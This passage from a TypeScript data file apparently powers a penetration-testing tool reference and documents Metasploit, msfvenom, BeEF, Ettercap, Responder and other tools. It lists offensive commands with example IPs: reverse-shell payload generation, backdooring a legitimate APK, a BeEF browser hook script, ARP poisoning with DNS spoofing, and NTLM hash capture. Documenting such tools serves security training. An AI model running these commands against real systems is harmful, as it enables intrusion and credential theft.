interface Flag {
  flag: string
  description: string
}

interface Command {
  title: string
  syntax: string
  description: string
  example?: string
  flags?: Flag[]
}

interface ToolData {
  name: string
  slug: string
  category: string
  subcategory?: string
  description: string
  longDescription: string
  commands: Command[]
  useCases: string[]
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced'
  tags: string[]
  relatedTools: string[]
  installCommand?: string
  featured?: boolean
}

export const toolsPart3: ToolData[] = [
  // ─────────────────────────────────────────────
  // EXPLOITATION TOOLS
  // ─────────────────────────────────────────────
  {
    name: 'Metasploit Framework',
    slug: 'metasploit',
    category: 'Exploitation Tools',
    subcategory: 'Exploit Frameworks',
    featured: true,
    difficulty: 'Intermediate',
    description:
      'The world\'s most widely used penetration testing framework, providing a curated database of exploits, payloads, and auxiliary modules for comprehensive security assessments.',
    longDescription:
      'Metasploit Framework is an open-source penetration testing platform developed by Rapid7 that enables security professionals to find, exploit, and validate vulnerabilities. It bundles hundreds of ready-to-use exploits across every major platform, a rich payload library including the powerful Meterpreter shell, and auxiliary modules for scanning, fuzzing, and brute-forcing. The interactive console (msfconsole) ties everything together with a consistent interface, making it the de-facto standard for offensive security work in both red-team engagements and capture-the-flag competitions.',
    commands: [
      {
        title: 'Start Metasploit Console',
        syntax: 'msfconsole',
        description:
          'Launches the interactive Metasploit console. Use -q to suppress the banner for faster startup in scripts.',
        example: 'msfconsole',
      },
      {
        title: 'Search for Exploits',
        syntax: 'search type:exploit platform:windows',
        description:
          'Searches the module database by type, platform, CVE, name, or author. Combine multiple filters to narrow results.',
        example: 'search type:exploit platform:windows name:smb',
      },
      {
        title: 'Load a Module',
        syntax: 'use exploit/windows/smb/ms17_010_eternalblue',
        description:
          'Loads the specified module into context so its options become configurable. The full module path must be used.',
        example: 'use exploit/windows/smb/ms17_010_eternalblue',
      },
      {
        title: 'Show Module Options',
        syntax: 'show options',
        description:
          'Displays all configurable options for the currently loaded module, marking required fields and showing current values.',
        example: 'show options',
      },
      {
        title: 'Set Target Host',
        syntax: 'set RHOSTS <target>',
        description:
          'Sets the remote target. Accepts a single IP, a CIDR range, or a file path prefixed with "file:".',
        example: 'set RHOSTS 192.168.1.50',
        flags: [
          { flag: 'RHOSTS', description: 'Remote target IP, range, or hostname' },
          { flag: 'TARGET', description: 'Specific target index when the module supports multiple target types' },
        ],
      },
      {
        title: 'Set Payload',
        syntax: 'set payload windows/x64/meterpreter/reverse_tcp',
        description:
          'Selects the payload to be delivered upon successful exploitation. The payload architecture must match the target.',
        example: 'set payload windows/x64/meterpreter/reverse_tcp',
        flags: [
          { flag: 'PAYLOAD', description: 'Full payload path, e.g. windows/x64/meterpreter/reverse_tcp' },
        ],
      },
      {
        title: 'Set Local Host (LHOST)',
        syntax: 'set LHOST <attacker-ip>',
        description:
          'Sets the attacker\'s IP address that the target will call back to for reverse payloads.',
        example: 'set LHOST 192.168.1.100',
        flags: [
          { flag: 'LHOST', description: 'Attacker IP or hostname for reverse-connection payloads' },
          { flag: 'LPORT', description: 'Listening port for the reverse connection (default 4444)' },
          { flag: 'VERBOSE', description: 'Enable detailed module output' },
        ],
      },
      {
        title: 'Run / Exploit',
        syntax: 'run',
        description:
          'Executes the loaded module with all configured options. "exploit" is an alias. Append -j to run as a background job.',
        example: 'run',
      },
      {
        title: 'Manage Sessions',
        syntax: 'sessions -l',
        description:
          'Lists all active sessions. Use -i <id> to interact with a session, -k <id> to kill it, or -u <id> to upgrade a shell to Meterpreter.',
        example: 'sessions -l\nsessions -i 1',
        flags: [
          { flag: '-l', description: 'List all open sessions' },
          { flag: '-i <id>', description: 'Interact with session by ID' },
          { flag: '-k <id>', description: 'Kill a session by ID' },
          { flag: '-u <id>', description: 'Upgrade a basic shell session to Meterpreter' },
        ],
      },
      {
        title: 'Background Current Session',
        syntax: 'background',
        description:
          'Sends the active Meterpreter or shell session to the background so you can use the msfconsole prompt without closing the connection.',
        example: 'background',
      },
    ],
    useCases: [
      'Exploiting known CVEs against unpatched network services',
      'Delivering post-exploitation payloads after initial access',
      'Automating vulnerability validation in internal pen tests',
      'Building and catching reverse shells during red-team exercises',
      'Pivoting through compromised hosts to reach isolated network segments',
    ],
    tags: ['exploitation', 'framework', 'payload', 'meterpreter', 'CVE', 'post-exploitation', 'red-team'],
    relatedTools: ['msfvenom', 'armitage', 'cobalt-strike'],
  },

  {
    name: 'Msfvenom',
    slug: 'msfvenom',
    category: 'Exploitation Tools',
    subcategory: 'Payload Generation',
    featured: true,
    difficulty: 'Intermediate',
    description:
      'Metasploit\'s standalone payload generator and encoder that creates shellcode, executables, and malicious APKs for use in penetration tests.',
    longDescription:
      'Msfvenom combines the legacy msfpayload and msfencode tools into a single, flexible command-line utility. It can generate payloads for virtually every operating system and output them in dozens of formats — raw shellcode, PE executables, ELF binaries, JAR files, Android APKs, PHP scripts, and more. Encoders can obfuscate payloads to bypass simple signature-based defences, and the -x flag allows injecting a payload into a legitimate application template so the resulting binary appears functional to the victim.',
    commands: [
      {
        title: 'List Available Payloads',
        syntax: 'msfvenom --list payloads | grep <filter>',
        description:
          'Displays all built-in payloads. Pipe through grep to filter by platform, arch, or connection type.',
        example: 'msfvenom --list payloads | grep android',
      },
      {
        title: 'Generate Android APK Payload',
        syntax: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o <output.apk>',
        description:
          'Creates a standalone Android APK that opens a Meterpreter reverse TCP session back to the attacker when installed and launched on the target device.',
        example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o evil.apk',
        flags: [
          { flag: '-p', description: 'Payload name' },
          { flag: '-o', description: 'Output file path' },
        ],
      },
      {
        title: 'Generate Windows Executable',
        syntax: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <output.exe>',
        description:
          'Produces a Windows PE executable that initiates a Meterpreter reverse TCP connection to the attacker.',
        example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe',
        flags: [
          { flag: '-f', description: 'Output format (exe, elf, raw, dll, asp, etc.)' },
        ],
      },
      {
        title: 'Generate Linux ELF Binary',
        syntax: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o <output.elf>',
        description:
          'Creates a Linux ELF executable for x86 systems that calls back to the attacker with a Meterpreter session.',
        example: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf',
      },
      {
        title: 'Generate PHP Web Shell',
        syntax: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o <output.php>',
        description:
          'Creates a PHP script that, when placed on a web server and requested by a browser, opens a Meterpreter session back to the attacker.',
        example: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php',
      },
      {
        title: 'Embed Payload into Legitimate APK',
        syntax: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x <original.apk> -o <embedded.apk>',
        description:
          'Injects a Meterpreter payload into an existing APK template. The resulting APK retains the original app\'s functionality while silently opening a backdoor.',
        example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x original.apk -o embedded.apk',
        flags: [
          { flag: '-x', description: 'Path to an existing APK/EXE to use as the payload template' },
          { flag: '-e', description: 'Encoder to use, e.g. x86/shikata_ga_nai' },
          { flag: '-i', description: 'Number of encoding iterations to apply' },
          { flag: '-b', description: 'Bad characters to avoid in the payload bytes' },
        ],
      },
      {
        title: 'List Available Encoders',
        syntax: 'msfvenom --list encoders',
        description:
          'Lists all payload encoders with their reliability ratings. Use encoders with the -e flag to obfuscate shellcode.',
        example: 'msfvenom --list encoders',
      },
    ],
    useCases: [
      'Generating cross-platform reverse shells for penetration tests',
      'Creating Android APKs to test mobile device management controls',
      'Producing encoded payloads to evaluate AV evasion',
      'Embedding backdoors in legitimate application templates',
      'Generating shellcode for buffer-overflow exploit development',
    ],
    tags: ['payload', 'shellcode', 'apk', 'reverse-shell', 'encoder', 'msfvenom', 'android'],
    relatedTools: ['metasploit', 'veil', 'shellter'],
  },

  {
    name: 'Searchsploit',
    slug: 'searchsploit',
    category: 'Exploitation Tools',
    subcategory: 'Exploit Search',
    difficulty: 'Beginner',
    description:
      'Command-line search utility for the Exploit-DB archive that lets you find and copy public exploits while completely offline.',
    longDescription:
      'Searchsploit ships with Kali Linux and maintains a local mirror of Exploit-DB so you can search for public proof-of-concept exploits without an internet connection. Results show the exploit title, CVE, and local file path. You can examine the source directly in the terminal or mirror a copy into your working directory ready for modification. Regular database updates via --update keep the local copy current.',
    commands: [
      {
        title: 'Search for Exploits by Product/Version',
        syntax: 'searchsploit <product> <version>',
        description:
          'Searches the local Exploit-DB copy for any exploits matching the given product name and optional version string.',
        example: 'searchsploit apache 2.4',
        flags: [
          { flag: '-t', description: 'Search only in the exploit title rather than the full description' },
          { flag: '-w', description: 'Show the Exploit-DB web URL alongside each result' },
          { flag: '-p', description: 'Print the full path of a matched exploit file' },
        ],
      },
      {
        title: 'Search by CVE Number',
        syntax: 'searchsploit --cve <CVE-ID>',
        description:
          'Looks up exploits associated with a specific CVE identifier. Useful when you already know the vulnerability from a scanner report.',
        example: 'searchsploit --cve 2021-44228',
      },
      {
        title: 'Copy Exploit to Working Directory',
        syntax: 'searchsploit -m <exploit-id>',
        description:
          'Mirrors (copies) the exploit file identified by its Exploit-DB ID into the current directory so you can edit and run it without touching the original archive.',
        example: 'searchsploit -m 44228',
        flags: [
          { flag: '-m', description: 'Mirror (copy) the exploit to the current directory' },
          { flag: '-x', description: 'Examine (print) the exploit source in the terminal without copying' },
        ],
      },
      {
        title: 'Update Exploit Database',
        syntax: 'searchsploit --update',
        description:
          'Pulls the latest exploits from Exploit-DB and refreshes the local cache. Requires an internet connection.',
        example: 'searchsploit --update',
      },
    ],
    useCases: [
      'Quickly finding public exploits for vulnerabilities found during network scans',
      'Working with Exploit-DB in air-gapped or offline environments',
      'Pulling exploit source code as a starting point for custom modifications',
      'Cross-referencing CVE numbers with known proof-of-concept code',
    ],
    tags: ['exploit-db', 'CVE', 'search', 'offline', 'searchsploit'],
    relatedTools: ['metasploit', 'exploitdb'],
  },

  {
    name: 'BeEF XSS Framework',
    slug: 'beef-xss',
    category: 'Exploitation Tools',
    subcategory: 'Browser Exploitation',
    difficulty: 'Intermediate',
    description:
      'Browser Exploitation Framework that hooks victim browsers via a JavaScript payload and provides a real-time control panel for launching client-side attacks.',
    longDescription:
      'BeEF (Browser Exploitation Framework) focuses on the web browser as an attack vector. Once a victim loads a page containing the BeEF hook script, their browser connects to the BeEF command-and-control server and becomes a "hooked browser". From the web-based control panel the attacker can run hundreds of browser-side modules: social engineering dialogs, credential harvesting, network discovery, webcam access, clipboard theft, and more — all executed inside the victim\'s browser sandbox without requiring any traditional exploit.',
    commands: [
      {
        title: 'Start BeEF Server',
        syntax: 'cd /usr/share/beef-xss && ./beef',
        description:
          'Launches the BeEF server. On first run it prompts you to change the default credentials. The API and UI ports are configured in config.yaml.',
        example: 'cd /usr/share/beef-xss && ./beef',
      },
      {
        title: 'Access the Control Panel',
        syntax: 'firefox http://192.168.1.100:3000/ui/panel',
        description:
          'Opens the BeEF web UI in a browser. Log in with the credentials set during first run. The dashboard shows all currently hooked browsers.',
        example: 'firefox http://192.168.1.100:3000/ui/panel',
      },
      {
        title: 'Inject the Hook Script into a Page',
        syntax: '<script src="http://192.168.1.100:3000/hook.js"></script>',
        description:
          'The JavaScript snippet that must be loaded by the victim\'s browser. It can be injected via a reflected/stored XSS vulnerability, a cloned phishing page, or a MITM proxy.',
        example: '<script src="http://192.168.1.100:3000/hook.js"></script>',
      },
      {
        title: 'Execute a Module via REST API',
        syntax: 'curl -s -H "Content-Type: application/json" -d \'{"text":"Test"}\' "http://192.168.1.100:3000/api/modules/<session>/alert_dialog/run?token=<api-token>"',
        description:
          'Automates BeEF module execution against a hooked session through the REST API. Useful for scripting attack chains without interacting with the web UI.',
        example: 'curl -s -H "Content-Type: application/json" -d \'{"text":"Security Test"}\' "http://192.168.1.100:3000/api/modules/abc123/alert_dialog/run?token=myapitoken"',
      },
    ],
    useCases: [
      'Demonstrating the impact of stored XSS vulnerabilities to clients',
      'Harvesting credentials through browser-based social engineering dialogs',
      'Performing network discovery from inside the victim\'s browser',
      'Chaining XSS with browser exploitation during web application assessments',
    ],
    tags: ['xss', 'browser', 'hook', 'javascript', 'social-engineering', 'client-side'],
    relatedTools: ['setoolkit', 'burpsuite', 'mitmproxy'],
  },

  {
    name: 'RouterSploit',
    slug: 'routersploit',
    category: 'Exploitation Tools',
    subcategory: 'Embedded Device Exploitation',
    difficulty: 'Intermediate',
    description:
      'Open-source exploitation framework dedicated to embedded devices — routers, cameras, and IoT hardware — with built-in scanners and CVE-mapped exploits.',
    longDescription:
      'RouterSploit mirrors the Metasploit workflow but focuses exclusively on embedded networking hardware. It ships with scanners that fingerprint a target router and automatically check it against a library of known exploits covering devices from Netgear, D-Link, TP-Link, Linksys, and many others. Exploit modules can extract credentials, enable Telnet/SSH backdoors, or achieve remote code execution on vulnerable firmware versions. It is written in Python and runs on any platform that supports Python 3.',
    commands: [
      {
        title: 'Launch RouterSploit Console',
        syntax: 'rsf',
        description:
          'Starts the RouterSploit interactive console (rsf.py). The prompt changes to rsf > and tab-completion is available for all module paths.',
        example: 'rsf',
      },
      {
        title: 'Scan Target Router for Vulnerabilities',
        syntax: 'use scanners/routers/router_scan\nset target 192.168.1.1\nrun',
        description:
          'Loads the generic router scanner and tests the target against all known router exploits in the database. Vulnerable modules are highlighted in the results.',
        example: 'use scanners/routers/router_scan\nset target 192.168.1.1\nrun',
      },
      {
        title: 'Use a Specific Exploit',
        syntax: 'use exploits/routers/<vendor>/<exploit_name>\nset target 192.168.1.1\nrun',
        description:
          'Loads a vendor-specific exploit module, sets the target, and runs it. Check "show options" to confirm all required options are set.',
        example: 'use exploits/routers/netgear/multi_rce\nset target 192.168.1.1\nrun',
      },
    ],
    useCases: [
      'Assessing the security posture of routers and IoT devices on a network',
      'Identifying unpatched firmware vulnerabilities during internal audits',
      'Demonstrating default-credential risks on SOHO networking equipment',
      'Testing camera and NAS device exposure in IoT security reviews',
    ],
    tags: ['router', 'iot', 'embedded', 'firmware', 'exploit', 'network-device'],
    installCommand: 'pip3 install routersploit',
    relatedTools: ['metasploit', 'searchsploit'],
  },

  // ─────────────────────────────────────────────
  // SNIFFING & SPOOFING
  // ─────────────────────────────────────────────
  {
    name: 'Wireshark',
    slug: 'wireshark',
    category: 'Sniffing & Spoofing',
    subcategory: 'Packet Analysis',
    featured: true,
    difficulty: 'Beginner',
    description:
      'The world\'s most popular graphical network protocol analyser, capable of capturing and deeply inspecting hundreds of protocols in real time.',
    longDescription:
      'Wireshark provides both a rich GUI and the headless tshark CLI for capturing and analysing network traffic. Its dissector engine understands 3000+ protocols and decodes everything from raw Ethernet frames to encrypted TLS sessions (given the key log). Colour-coded packet lists, powerful display filters, TCP stream reassembly, and built-in statistics make it invaluable for troubleshooting, forensics, and protocol reverse engineering. tshark can be used in scripts and piped with other tools for automated traffic analysis.',
    commands: [
      {
        title: 'Launch Wireshark GUI',
        syntax: 'wireshark',
        description:
          'Opens the graphical interface. Select an interface from the welcome screen to begin live capture, or open an existing pcap file.',
        example: 'wireshark',
      },
      {
        title: 'Capture on a Specific Interface',
        syntax: 'wireshark -i <interface>',
        description:
          'Starts Wireshark and immediately begins a live capture on the specified interface, bypassing the welcome screen.',
        example: 'wireshark -i eth0',
      },
      {
        title: 'Capture with BPF Capture Filter',
        syntax: 'wireshark -i <interface> -f "<bpf-filter>"',
        description:
          'Applies a Berkeley Packet Filter at capture time to reduce the volume of traffic saved. Capture filters use tcpdump/BPF syntax.',
        example: 'wireshark -i eth0 -f "tcp port 80"',
      },
      {
        title: 'Open a Saved PCAP File',
        syntax: 'wireshark <file.pcap>',
        description:
          'Opens a previously saved capture file for offline analysis. Wireshark supports pcap, pcapng, and many other formats.',
        example: 'wireshark capture.pcap',
      },
      {
        title: 'Capture with tshark (CLI)',
        syntax: 'tshark -i <interface> -f "<bpf-filter>" -w <output.pcap>',
        description:
          'Uses the headless tshark utility to capture packets from the command line. Ideal for remote servers or automated pipelines. Display filters (-Y) can be applied when reading back the file.',
        example: 'tshark -i eth0 -f "host 192.168.1.50" -w output.pcap',
        flags: [
          { flag: 'http', description: 'Display filter: show only HTTP traffic' },
          { flag: 'tcp.port == 443', description: 'Display filter: show traffic on TCP port 443' },
          { flag: 'ip.addr == 192.168.1.50', description: 'Display filter: show traffic to/from specific IP' },
          { flag: 'http.request.method == "POST"', description: 'Display filter: show HTTP POST requests only' },
          { flag: 'dns', description: 'Display filter: show only DNS packets' },
          { flag: 'ftp', description: 'Display filter: show only FTP control traffic' },
        ],
      },
    ],
    useCases: [
      'Capturing and analysing cleartext credentials transmitted over HTTP or FTP',
      'Debugging network applications by examining protocol exchanges',
      'Performing post-incident forensics on captured network traffic',
      'Analysing malware C2 communication patterns from sandbox captures',
      'Verifying that encryption is properly applied to sensitive traffic',
    ],
    tags: ['packet-capture', 'pcap', 'protocol-analysis', 'network', 'tshark', 'forensics'],
    relatedTools: ['tcpdump', 'tshark', 'mitmproxy'],
  },

  {
    name: 'Tcpdump',
    slug: 'tcpdump',
    category: 'Sniffing & Spoofing',
    subcategory: 'Packet Capture',
    difficulty: 'Beginner',
    description:
      'The classic command-line packet analyser that captures network traffic matching BPF filters and saves or displays it in real time.',
    longDescription:
      'Tcpdump is a lightweight, universally available CLI packet sniffer that has been the go-to tool for network diagnostics since 1988. It captures raw packets, applies Berkeley Packet Filter expressions to select only the traffic of interest, and can display decoded packet headers in the terminal or write raw frames to a pcap file for later analysis in Wireshark. Its minimal resource footprint makes it ideal for embedded systems, remote SSH sessions, and high-throughput environments where a GUI tool would be impractical.',
    commands: [
      {
        title: 'Capture All Traffic on Interface',
        syntax: 'tcpdump -i <interface>',
        description:
          'Begins capturing all packets on the specified interface and prints abbreviated packet headers to stdout.',
        example: 'tcpdump -i eth0',
        flags: [
          { flag: '-i', description: 'Network interface to capture on (use "any" for all interfaces)' },
          { flag: '-n', description: 'Disable DNS resolution — show raw IP addresses instead of hostnames' },
          { flag: '-v/-vv/-vvv', description: 'Increase verbosity level of packet output' },
        ],
      },
      {
        title: 'Filter by Host',
        syntax: 'tcpdump -i <interface> host <ip>',
        description:
          'Captures only packets whose source or destination IP matches the given address.',
        example: 'tcpdump -i eth0 host 192.168.1.50',
      },
      {
        title: 'Filter by Port',
        syntax: 'tcpdump -i <interface> port <port>',
        description:
          'Captures only traffic on the specified TCP or UDP port. Combine with "and" for compound filters.',
        example: 'tcpdump -i eth0 port 80',
      },
      {
        title: 'Write Capture to File',
        syntax: 'tcpdump -i <interface> -w <output.pcap>',
        description:
          'Saves raw captured packets to a pcap file for later analysis in Wireshark or other tools.',
        example: 'tcpdump -i eth0 -w capture.pcap',
        flags: [
          { flag: '-w', description: 'Write raw packets to a pcap file instead of printing to stdout' },
          { flag: '-r', description: 'Read packets from a saved pcap file' },
          { flag: '-c', description: 'Exit after capturing the specified number of packets' },
        ],
      },
      {
        title: 'Read a Saved PCAP File',
        syntax: 'tcpdump -r <capture.pcap>',
        description:
          'Reads and displays packets from a previously saved capture file. All filter expressions still apply.',
        example: 'tcpdump -r capture.pcap',
      },
      {
        title: 'Capture HTTP Traffic in ASCII',
        syntax: 'tcpdump -i <interface> -A -s 0 port 80',
        description:
          'Captures HTTP traffic and prints the full packet payload in ASCII, making cleartext credentials and request bodies visible in the terminal.',
        example: 'tcpdump -i eth0 -A -s 0 port 80',
        flags: [
          { flag: '-A', description: 'Print packet payload in ASCII (useful for cleartext protocols)' },
          { flag: '-x', description: 'Print packet payload in hexadecimal' },
          { flag: '-s', description: 'Snapshot length — use 0 to capture the entire packet' },
          { flag: '-q', description: 'Quiet mode: less protocol information per packet line' },
        ],
      },
    ],
    useCases: [
      'Capturing traffic on remote servers over SSH without a GUI',
      'Writing pcap files for later analysis in Wireshark',
      'Debugging network connectivity issues at the packet level',
      'Monitoring cleartext protocols like HTTP, FTP, and Telnet for credentials',
      'Generating traffic samples for IDS signature testing',
    ],
    tags: ['packet-capture', 'pcap', 'bpf', 'network', 'cli', 'sniffer'],
    relatedTools: ['wireshark', 'tshark', 'ettercap'],
  },

  {
    name: 'Ettercap',
    slug: 'ettercap',
    category: 'Sniffing & Spoofing',
    subcategory: 'MITM Attack',
    difficulty: 'Intermediate',
    description:
      'Comprehensive man-in-the-middle attack suite supporting ARP poisoning, DNS spoofing, and live connection modification with both GUI and text modes.',
    longDescription:
      'Ettercap is a mature, feature-rich MITM framework that has been used by penetration testers since 2001. It poisons the ARP cache of two targets so all traffic between them passes through the attacker\'s machine. Once in the middle, Ettercap can sniff credentials from dozens of protocols, inject data into connections, strip HTTPS, and run filter scripts that rewrite live traffic on the fly. A plugin architecture extends its capabilities to DNS spoofing, port stealing, and password filtering.',
    commands: [
      {
        title: 'Launch Ettercap GUI',
        syntax: 'ettercap -G',
        description:
          'Opens the GTK graphical interface. Use the Sniff menu to select an interface, then Hosts > Scan for Hosts, and finally MITM > ARP Poisoning.',
        example: 'ettercap -G',
        flags: [
          { flag: '-G', description: 'Use the GTK graphical user interface' },
          { flag: '-T', description: 'Use text-only (terminal) mode' },
          { flag: '-q', description: 'Quiet mode — suppress verbose packet output' },
        ],
      },
      {
        title: 'ARP Poison MITM (Text Mode)',
        syntax: 'ettercap -T -q -i <interface> -M arp /192.168.1.1// /192.168.1.50//',
        description:
          'Runs Ettercap in text mode, performing ARP poisoning between the gateway (192.168.1.1) and the victim (192.168.1.50). All traffic between them is intercepted.',
        example: 'ettercap -T -q -i eth0 -M arp /192.168.1.1// /192.168.1.50//',
        flags: [
          { flag: '-i', description: 'Network interface to use' },
          { flag: '-M', description: 'MITM attack method (arp, icmp, dhcp, port)' },
          { flag: '-w', description: 'Write sniffed packets to a pcap file' },
          { flag: '-P', description: 'Load a plugin, e.g. -P dns_spoof' },
        ],
      },
      {
        title: 'List Available Plugins',
        syntax: 'ettercap --list-plugins',
        description:
          'Displays all installed Ettercap plugins including dns_spoof, autoadd, chk_poison, and others.',
        example: 'ettercap --list-plugins',
      },
      {
        title: 'ARP Poison with DNS Spoofing Plugin',
        syntax: 'ettercap -T -q -i <interface> -M arp -P dns_spoof /192.168.1.1// /192.168.1.50//',
        description:
          'Combines ARP poisoning with the dns_spoof plugin to redirect DNS queries from the victim to attacker-controlled IPs. Edit /etc/ettercap/etter.dns to set spoofed entries.',
        example: 'ettercap -T -q -i eth0 -M arp -P dns_spoof /192.168.1.1// /192.168.1.50//',
      },
    ],
    useCases: [
      'Intercepting cleartext credentials on local network segments',
      'Demonstrating ARP spoofing risks to network security teams',
      'Performing DNS spoofing to redirect victims to phishing pages',
      'Analysing unencrypted protocol traffic during internal assessments',
    ],
    tags: ['arp-spoofing', 'mitm', 'dns-spoof', 'sniffing', 'lan', 'network'],
    relatedTools: ['bettercap', 'arpspoof', 'wireshark'],
  },

  {
    name: 'Bettercap',
    slug: 'bettercap',
    category: 'Sniffing & Spoofing',
    subcategory: 'MITM Attack',
    difficulty: 'Intermediate',
    description:
      'Modern, modular MITM framework with a real-time web UI and interactive REPL that supports ARP/ND spoofing, HTTP/S proxying, Wi-Fi attacks, and BLE sniffing.',
    longDescription:
      'Bettercap is the spiritual successor to Ettercap, rewritten from scratch in Go for performance and extensibility. Its caplet scripting system lets you automate complex attack sequences with a simple scripting language. The interactive REPL allows enabling and tuning modules on the fly, and the built-in web dashboard provides a visual overview of the network and active attack sessions. It supports wired Ethernet, Wi-Fi (deauth, probe harvesting, PMKID capture), Bluetooth Low Energy, and HID injection.',
    commands: [
      {
        title: 'Start Bettercap on Interface',
        syntax: 'bettercap -iface <interface>',
        description:
          'Launches the interactive Bettercap REPL bound to the specified network interface.',
        example: 'bettercap -iface eth0',
      },
      {
        title: 'Discover Hosts on the Network',
        syntax: 'net.probe on',
        description:
          'Activates the network probe module, which sends ARP, mDNS, and NBNS probes to discover all live hosts on the local subnet. Results appear in the hosts table.',
        example: 'net.probe on',
      },
      {
        title: 'ARP Spoof a Target',
        syntax: 'set arp.spoof.targets 192.168.1.50; arp.spoof on',
        description:
          'Configures the ARP spoofing module to target a specific IP and enables it. The gateway\'s MAC is also poisoned so the attack is bidirectional.',
        example: 'set arp.spoof.targets 192.168.1.50\narp.spoof on',
      },
      {
        title: 'Enable HTTP Proxy',
        syntax: 'http.proxy on',
        description:
          'Starts the transparent HTTP proxy to intercept, log, and optionally modify cleartext HTTP requests and responses from spoofed targets.',
        example: 'http.proxy on',
      },
      {
        title: 'Sniff All Network Traffic',
        syntax: 'net.sniff on',
        description:
          'Enables the packet sniffer module which automatically extracts and logs credentials, cookies, and interesting data from intercepted traffic.',
        example: 'net.sniff on',
      },
    ],
    useCases: [
      'Performing ARP spoofing and credential sniffing on LAN segments',
      'Intercepting and modifying HTTP/S traffic with proxy modules',
      'Wi-Fi reconnaissance and client deauthentication attacks',
      'Automating attack chains with caplet scripts for red-team engagements',
    ],
    tags: ['arp-spoofing', 'mitm', 'proxy', 'wifi', 'sniffing', 'bettercap', 'repl'],
    relatedTools: ['ettercap', 'mitmproxy', 'arpspoof'],
  },

  {
    name: 'Responder',
    slug: 'responder',
    category: 'Sniffing & Spoofing',
    subcategory: 'Credential Capture',
    difficulty: 'Intermediate',
    description:
      'LLMNR, NBT-NS, and MDNS poisoner that captures NTLMv1/v2 challenge-response hashes from Windows machines that broadcast name resolution queries.',
    longDescription:
      'Responder listens for broadcast name resolution requests (LLMNR, NetBIOS Name Service, mDNS) that Windows hosts send when DNS fails to resolve a hostname. It responds to these requests, claiming to be the requested host, and forces the victim to authenticate — capturing the NTLMv1 or NTLMv2 challenge-response hash. These hashes can then be cracked offline with Hashcat or John the Ripper, or relayed directly to other services using tools like impacket\'s ntlmrelayx. Responder also includes rogue SMB, HTTP, HTTPS, FTP, LDAP, and SQL servers to maximise credential capture opportunities.',
    commands: [
      {
        title: 'Start Responder on Interface',
        syntax: 'responder -I <interface> -rdwv',
        description:
          'Activates Responder with NBNS (-r), DHCP (-d), and WPAD (-w) poisoning enabled in verbose mode. Captured hashes are written to /usr/share/responder/logs/.',
        example: 'responder -I eth0 -rdwv',
        flags: [
          { flag: '-I', description: 'Network interface to listen on' },
          { flag: '-r', description: 'Activate NBNS poisoning' },
          { flag: '-d', description: 'Activate DHCP rogue responses' },
          { flag: '-w', description: 'Start the WPAD rogue proxy server' },
          { flag: '-v', description: 'Verbose output showing all captured packets' },
        ],
      },
      {
        title: 'Analyze Mode (No Poisoning)',
        syntax: 'responder -I <interface> -A',
        description:
          'Passively listens for broadcast name-resolution queries without responding to them. Use this to map the network and detect responder-vulnerable clients without alerting defenders.',
        example: 'responder -I eth0 -A',
        flags: [
          { flag: '-A', description: 'Analyze mode — listen only, do not send poisoned responses' },
        ],
      },
      {
        title: 'Review Captured Hashes',
        syntax: 'cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt',
        description:
          'Responder writes captured hashes to per-protocol log files named by protocol and source IP. Review these files to collect hashes for offline cracking.',
        example: 'cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt',
      },
    ],
    useCases: [
      'Capturing NTLMv2 hashes on Windows Active Directory networks',
      'Demonstrating the impact of default Windows name-resolution behaviour',
      'Collecting credentials for password-spray or offline cracking campaigns',
      'Mapping which hosts are susceptible to LLMNR/NBT-NS poisoning',
    ],
    tags: ['ntlm', 'llmnr', 'nbns', 'credential-capture', 'windows', 'active-directory', 'hash'],
    relatedTools: ['impacket', 'hashcat', 'john'],
  },

  {
    name: 'Mitmproxy',
    slug: 'mitmproxy',
    category: 'Sniffing & Spoofing',
    subcategory: 'HTTP Proxy',
    difficulty: 'Intermediate',
    description:
      'Interactive TLS-capable HTTP/S proxy that intercepts, inspects, modifies, and replays web traffic from both command-line and browser-based interfaces.',
    longDescription:
      'Mitmproxy is a feature-rich Python-based proxy that operates in three modes: the interactive TUI (mitmproxy), a browser-based UI (mitmweb), and a non-interactive stream recorder (mitmdump). It automatically generates TLS certificates on the fly to decrypt HTTPS traffic. A powerful Python scripting API allows writing custom addons that manipulate request/response objects programmatically — enabling fuzzing, automated credential extraction, API tampering, and replay attacks. It supports regular, transparent, SOCKS5, and reverse proxy modes.',
    commands: [
      {
        title: 'Start Interactive TUI Proxy',
        syntax: 'mitmproxy --listen-port <port>',
        description:
          'Launches the terminal-based interactive interface on the specified port (default 8080). Configure the browser to use 127.0.0.1:<port> as an HTTP proxy.',
        example: 'mitmproxy --listen-port 8080',
        flags: [
          { flag: '--listen-port', description: 'Port to listen on (default 8080)' },
          { flag: '--ssl-insecure', description: 'Skip upstream TLS certificate verification' },
          { flag: '--mode', description: 'Proxy mode: regular (default), transparent, socks5, or reverse' },
        ],
      },
      {
        title: 'Start Browser-Based UI (mitmweb)',
        syntax: 'mitmweb',
        description:
          'Launches mitmproxy with a web dashboard on http://127.0.0.1:8081. The web UI allows filtering, inspecting, and replaying flows from any browser.',
        example: 'mitmweb',
      },
      {
        title: 'Record Traffic to File (mitmdump)',
        syntax: 'mitmdump -w <output.bin>',
        description:
          'Runs mitmproxy non-interactively, saving all flows to a binary file for later offline analysis or replay.',
        example: 'mitmdump -w output.bin',
        flags: [
          { flag: '-w', description: 'Write flows to a binary dump file' },
          { flag: '-r', description: 'Read and replay flows from a previously saved dump file' },
          { flag: '-s', description: 'Load a Python addon/script for custom traffic manipulation' },
        ],
      },
      {
        title: 'Run with a Custom Python Script',
